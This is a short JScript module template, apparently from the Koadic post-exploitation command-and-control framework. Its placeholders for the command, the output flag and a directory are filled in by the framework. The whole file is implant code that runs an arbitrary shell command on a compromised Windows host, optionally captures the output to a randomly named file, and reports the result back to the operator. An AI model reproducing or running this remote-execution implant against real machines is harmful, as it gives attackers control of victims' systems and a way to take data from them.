try
{
    var readout = ~OUTPUT~;
    if (readout)
    {
        var output = Koadic.shell.exec("~CMD~", "~DIRECTORY~\\"+Koadic.uuid()+".txt");
    }
    else
    {
        var output = "";
        Koadic.shell.run("~CMD~");
        Koadic.work.report();
    }

    if (output != "")
    {
        Koadic.work.report(output);
    }
}
catch (e)
{
    Koadic.work.error(e);
}

Koadic.exit();
